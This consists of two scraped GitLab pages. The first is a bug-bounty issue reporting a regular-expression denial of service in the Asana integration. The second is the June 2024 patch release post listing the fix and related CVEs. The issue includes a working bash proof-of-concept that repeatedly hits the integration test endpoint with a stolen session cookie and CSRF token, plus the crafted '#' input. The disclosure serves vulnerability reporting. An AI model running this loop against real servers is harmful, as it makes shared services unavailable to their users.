=== Content from gitlab.com_281a8396_20250110_194542.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ReDoS in Asana integration issue mapping when webhook is called

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2376482](https://hackerone.com/reports/2376482)** by `joaxcar` on 2024-02-16, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

##### Summary

This is the regexp to check for "issue references" in data parsed to send as webhook calls when using the Asana integration. The regexp is here

<https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/models/integrations/asana.rb?ref_type=heads#L70>

```
      issue_finder = %r{(fix\w*|clos[ei]\w*+)?\W*(?:https://app\.asana\.com/\d+/\w+/(\w+)|#(\w+))}i
```

It's subject to catastrophic backtracking when given a sting of this pattern

```
'#'.repeat(50000)
```

This regexp is called everytime a commit is made to the project (Assan integration works by "Add commit messages as comments to Asana tasks"). An attacker can either make a new commit to an attacker project every second to overload the server, but there is also another way using "Test webhook" functionality. When configuring a webhook there is a feature to test the webhook that will also send with it the latest commit message.

There is a rate limit on the test function (5 requests per project per minute) which requires the attacker to create multiple projects to be able to send the right amount of requests (depending on the architecture). The limit for 1K reference architecture is 1 request per second for `availability: high`. An attack using 6 projects will be able to send one request every second second and this is enough to make this architecture unresponsive.

##### Steps to reproduce

Use a local hosted Gitlab server

1. Log in to Gitlab
2. Create a new group called `dos_test`
3. Create between 3 and 6 new projects in the group (name them `dos1`, `dos2` and so on)
4. In each project go to <http://gitlab.example.com/test_dos/dos1/-/settings/integrations/asana/edit>
5. Add anything in the API field and make sure "active" is checked. Then save
6. Go to <http://gitlab.example.com/test_dos/dos1> (for each project) and create a new file in the project. Name the file `a` and add a commit message containing 50 000 `#` chars. Make the commit.
7. Open devtools and run this command in the browser terminal

```
document.querySelector("[name=csrf-token]").content
```

copy the output and use it as "CSRF-TOKEN" in the script on step 8

7. In devtools go to the "Application" tab and to "cookies". Copy the value of the cookie `_gitlab_session` and use it in the script at step 8 as "GITLAB-ID"

8. Run this command, replace `URL`, `CSRF_TOKEN`, `GITLAB_ID` and the `PROJECTS` array

```
###  !/bin/bash

URL="http://20.236.120.94"
CSRF_TOKEN="5Zki01_ebEKki6bBjz-s-ZSlRVwCS_1ez-cx9qwwPMsVI5opcM7HYGDNBw9W91OL7IOTOP_HBIq9toVAR_6Zmg"
GITLAB_ID="0eb6270bab31b8f16ce051e4f389a800"

###  Array of project names
PROJECTS=("test_dos/dos10" "test_dos/dos11" "test_dos/dos12")

###  Duration for the loop to run: 10 minutes (600 seconds)
DURATION=15

###  Start time
START_TIME=$(date +%s)

###  Index to keep track of the current URL
INDEX=1

###  Get the number of projects in the array
PROJECT_COUNT=${#PROJECTS[@]}

###  Loop until the duration is reached
while [ $(($(date +%s) - START_TIME)) -lt $DURATION ]; do
    # Current URL to make the curl request to
    PROJECT=${PROJECTS[INDEX]}

    # Make the curl request
    curl "$URL/$PROJECT/-/settings/integrations/asana/test" \
  -X 'PUT' \
  -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7kqTFLAKyBteZvzK' \
  -H "Cookie: _gitlab_session=$GITLAB_ID" \
  -H "X-CSRF-Token: $CSRF_TOKEN" \
  --data-raw $'------WebKitFormBoundary7kqTFLAKyBteZvzK\r\nContent-Disposition: form-data; name="_method"\r\n\r\nput\r\n------WebKitFormBoundary7kqTFLAKyBteZvzK\r\nContent-Disposition: form-data; name="authenticity_token"\r\n\r\sss\r\n------WebKitFormBoundary7kqTFLAKyBteZvzK\r\nContent-Disposition: form-data; name="redirect_to"\r\n\r\nhttp://20.236.120.94/test_dos/dos9/-/settings/integrations/asana/edit\r\n------WebKitFormBoundary7kqTFLAKyBteZvzK\r\nContent-Disposition: form-data; name="service[active]"\r\n\r\ntrue\r\n------WebKitFormBoundary7kqTFLAKyBteZvzK\r\nContent-Disposition: form-data; name="service[api_key]"\r\n\r\n\r\n------WebKitFormBoundary7kqTFLAKyBteZvzK\r\nContent-Disposition: form-data; name="service[restrict_to_branch]"\r\n\r\n\r\n------WebKitFormBoundary7kqTFLAKyBteZvzK--\r\n' &

    # Increment the index to move to the next project
    INDEX=$((INDEX + 1))

    # Reset the index to 0 if it reaches the end of the array
    if [ $INDEX -eq $(($PROJECT_COUNT+1)) ]; then
        INDEX=1
    fi

    # Wait for 1 second
    sleep 1
done
```

9. SSH into the gitlab server and use `top` or `htop` to view the CPU usage

[![Screenshot_2024-02-16_at_17.44.54.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/0109ce8c3a5adb9371a51e95ae978a028920670f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f31373538663437322d643461362d343862332d613463662d3539326364313030346437312f53637265656e73686f745f323032342d30322d31365f61745f31372e34342e35342e706e67)

Here is a video showing the CPU usage

[dos\_poc.mov](https://user-content.gitlab-static.net/d06bd2b5bbd81e3271c03ae4c3cb86817d6ec8ff/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f66376332396232342d336532382d343735302d613633342d6366303134306433353431612f646f735f706f632e6d6f76 "Download 'dos_poc.mov'")

##### Impact

DOS of gitlab instance and exhaustive resource consumption

##### What is the current *bug* behavior?

Asana issues mapping causes DOS system wide

##### What is the expected *correct* behavior?

Asana issues should not cause REDOS

#### Impact

DOS of gitlab instance and exhaustive resource consumption

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screenshot\_2024-02-16\_at\_17.44.54.png](https://h1.sec.gitlab.net/a/1758f472-d4a6-48b3-a4cf-592cd1004d71/Screenshot_2024-02-16_at_17.44.54.png)
* [dos\_poc.mov](https://h1.sec.gitlab.net/a/f7c29b24-3e28-4750-a634-cf0140d3541a/dos_poc.mov)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from about.gitlab.com_8985c637_20250110_194541.html ===


[←
Back to
releases](/releases/categories/releases/)
Jun 12, 2024

-
[Greg Myers](/company/team/#gitlab)
# GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7

Learn more about GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

Today we are releasing versions 17.0.2, 16.11.4, 16.10.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain important bug and security fixes, and we strongly recommend that all GitLab installations be upgraded to
one of these versions immediately. GitLab.com is already running the patched version.

GitLab releases fixes for vulnerabilities in dedicated patch releases. There are two types of patch releases:
scheduled releases, and ad-hoc critical patches for high-severity vulnerabilities. Scheduled releases are released twice a month on the second and fourth Wednesdays.
For more information, you can visit our [releases handbook](https://handbook.gitlab.com/handbook/engineering/releases/) and [security FAQ](https://about.gitlab.com/security/faq/).
You can see all of GitLab release blog posts [here](/releases/categories/releases/).

For security fixes, the issues detailing each vulnerability are made public on our
[issue tracker](https://gitlab.com/gitlab-org/gitlab/-/issues/?sort=created_date&state=closed&label_name%5B%5D=bug%3A%3Avulnerability&confidential=no&first_page_size=100)
30 days after the release in which they were patched.

We are dedicated to ensuring all aspects of GitLab that are exposed to customers or that host customer data are held to
the highest security standards. As part of maintaining good security hygiene, it is highly recommended that all customers
upgrade to the latest patch release for their supported version. You can read more
[best practices in securing your GitLab instance](/blog/2020/05/20/gitlab-instance-security-best-practices/) in our blog post.

### Recommended Action

We **strongly recommend** that all installations running a version affected by the issues described below are **upgraded to the latest version as soon as possible**.

When no specific deployment type (omnibus, source code, helm chart, etc.) of a product is mentioned, this means all types are affected.

## Security fixes

### Table of security fixes

| Title | Severity |
| --- | --- |
| [ReDoS in gomod dependency linker](#redos-in-gomod-dependency-linker) | Medium |
| [ReDoS in CI interpolation (fix bypass)](#redos-in-ci-interpolation-fix-bypass) | Medium |
| [ReDoS in Asana integration issue mapping when webhook is called](#redos-in-asana-integration-issue-mapping-when-webhook-is-called) | Medium |
| [XSS and content injection when viewing raw XHTML files on IOS devices](#xss-and-content-injection-when-viewing-raw-xhtml-files-on-ios-devices) | Medium |
| [Missing agentk request validation could cause KAS to panic](#missing-agentk-request-validation-could-cause-kas-to-panic) | Low |

### ReDoS in gomod dependency linker

An issue has been discovered in GitLab CE/EE affecting all versions starting from 13.1 prior to 16.10.7, starting from 16.11 prior to 16.11.4, and starting from 17.0 prior to 17.0.2. It was possible for an attacker to cause a denial of service using maliciously crafted file.
This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`, 6.5).
It is now mitigated in the latest release and is assigned [CVE-2024-1495](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1495).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### ReDoS in CI interpolation (fix bypass)

An issue has been discovered in GitLab CE/EE affecting all versions prior to 16.10.7, starting from 16.11 prior to 16.11.4, and starting from 17.0 prior to 17.0.2. A vulnerability in GitLab's CI/CD pipeline editor could allow for denial of service attacks through maliciously crafted configuration files.
This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`, 6.5).
It is now mitigated in the latest release and is assigned [CVE-2024-1736](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1736).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### ReDoS in Asana integration issue mapping when webhook is called

An issue has been discovered in GitLab CE/EE affecting all versions starting from 8.4 prior to 16.10.7, starting from 16.11 prior to 16.11.4, and starting from 17.0 prior to 17.0.2. A vulnerability in GitLab's Asana integration allowed an attacker to potentially cause a regular expression denial of service by sending specially crafted requests.
This is a medium severity issue (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H`, 6.5).
It is now mitigated in the latest release and is assigned [CVE-2024-1963](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1963).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### XSS and content injection when viewing raw XHTML files on iOS devices

A cross-site scripting issue has been discovered in GitLab affecting all versions starting from 5.1 before 16.10.7, all versions starting from 16.11 before 16.11.4, all versions starting from 17.0 before 17.0.2. When viewing an XML file in a repository in raw mode, it can be made to render as HTML if viewed under specific circumstances.
This is a high severity issue (`CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N`, 4.4).
It is now mitigated in the latest release and is assigned [CVE-2024-4201](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4201).

Thanks [joaxcar](https://hackerone.com/joaxcar) for reporting this vulnerability through our HackerOne bug bounty program.

### Missing agentk request validation could cause KAS to panic

DoS in KAS in GitLab CE/EE affecting all versions from 16.10.0 prior to 16.10.6 and 16.11.0 prior to 16.11.3 allows an attacker to crash KAS via crafted gRPC requests.
This is a low severity issue (`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L`, 3.1).
It is now mitigated in the latest release and is assigned [CVE-2024-5469](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-5469).

This vulnerability has been discovered internally by the Environments team.

## Bug fixes

### 17.0.2

* [Makefile: update Git versions (v17.0 backport)](https://gitlab.com/gitlab-org/gitaly/-/merge_requests/6996)
* [Update VERSION files](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154018)
* [Docs: Backport Dedicated AI updates](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154019)
* [Fix failing specs in 17-0-stable-ee](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154505)
* [Include headers in LfsDownloadObject](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154624)
* [[17.0] Deprecate support for Ubuntu 18.04](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/155385)

### 16.11.4

* [Makefile: update Git versions (v16.11 backport)](https://gitlab.com/gitlab-org/gitaly/-/merge_requests/6997)
* [Backport 'run-release-environment-for-tag-commits' into 16.11](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/153752)
* [Dedicated AI updates](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154041)
* [Speed up as-if-foss Rubocop](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/153833)
* [Inclusion of headers in LfsDownloadObject for GitHub imports](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154370)
* [Fix failing specs on 16-11-stable](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154504)
* [Stop orphaning pages deployments on Geo secondaries on 16.11](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154838)

### 16.10.7

* [Makefile: update Git versions (v16.10 backport)](https://gitlab.com/gitlab-org/gitaly/-/merge_requests/6998)
* [Backport 'run-release-environment-for-tag-commits' into 16.10](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/153753)
* [Fix failing specs on 16-10-stable-ee](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154503)
* [Stop orphaning pages deployments on Geo secondaries on 16.10](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/154837)

## Updating

To update GitLab, see the [Update page](/update).
To update Gitlab Runner, see the [Updating the Runner page](https://docs.gitlab.com/runner/install/linux-repository.html#updating-the-runner).

## Receive Patch Notifications

To receive patch blog notifications delivered to your inbox, visit our [contact us](https://about.gitlab.com/company/contact/) page.
To receive release notifications via RSS, subscribe to our [patch release RSS feed](https://about.gitlab.com/security-releases.xml) or our [RSS feed for all releases](https://about.gitlab.com/all-releases.xml).

## Weâre combining patch and security releases

This improvement in our release process matches the industry standard and will help GitLab users get information about security and
bug fixes sooner, [read the blog post here](https://about.gitlab.com/blog/2024/03/26/were-combining-patch-and-security-releases/).

[GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7
via @gitlab

Click to tweet!](http://twitter.com/share?text=GitLab+Patch+Release%3A+17.0.2%2C+16.11.4%2C+16.10.7+via+%40gitlab&url=https://about.gitlab.com/releases/2024/06/12/patch-release-gitlab-17-0-2-released/&hashtags= "Tweet!")

* [security](/releases/tags.html#security)

[Share on Facebook](http://www.facebook.com/sharer.php?u=https://about.gitlab.com/releases/2024/06/12/patch-release-gitlab-17-0-2-released/)
[Share on X](http://x.com/share?url=https://about.gitlab.com/releases/2024/06/12/patch-release-gitlab-17-0-2-released/&text=GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7)
[Share on LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://about.gitlab.com/releases/2024/06/12/patch-release-gitlab-17-0-2-released/&title=GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7&summary=&source=)
[Share on Hacker News](https://news.ycombinator.com/submitlink?u=https://about.gitlab.com/releases/2024/06/12/patch-release-gitlab-17-0-2-released/&t=GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7)

* [Previous Post:
  GitLab Patch Release: 17.0.1, 16.11.3, 16.10.6](/releases/2024/05/22/patch-release-gitlab-17-0-1-released/ "GitLab Patch Release: 17.0.1, 16.11.3, 16.10.6")
* [Next Post:
  GitLab 17.1 released with Model registry available in
  ...](/releases/2024/06/20/gitlab-17-1-released/ "GitLab 17.1 released with Model registry available in beta and multiple GitLab Duo Code Suggestions in VS Code")

Sign up for GitLab's monthly newsletter

Thanks for subscribing!

### We want to hear from you

Enjoyed reading this blog post or have questions or feedback? Share your thoughts by creating a new topic in the GitLab community forum.

[Share your feedback](https://forum.gitlab.com/new-topic?title=GitLab Patch Release: 17.0.2, 16.11.4, 16.10.7&body=&tags=blog-feedback)

## Take GitLab for a spin

See what your team could do with The DevSecOps Platform.

[Get free trial](https://gitlab.com/-/trials/new?glm_content=default-saas-trial&glm_source=about.gitlab.com)

![](/images/cta/gitlab-enterprise-team-member-photos.png)

Have a question? We're here to help.

[Talk to an expert](https://about.gitlab.com/sales/)

[Edit this page](https://gitlab.com/-/ide/project/gitlab-com/www-gitlab-com/edit/master/-/sites/uncategorized/source/releases/posts/2024-06-12-patch-release-gitlab-17-0-2-released.html.md)
[View source](https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/sites/uncategorized/source/releases/posts/2024-06-12-patch-release-gitlab-17-0-2-released.html.md)


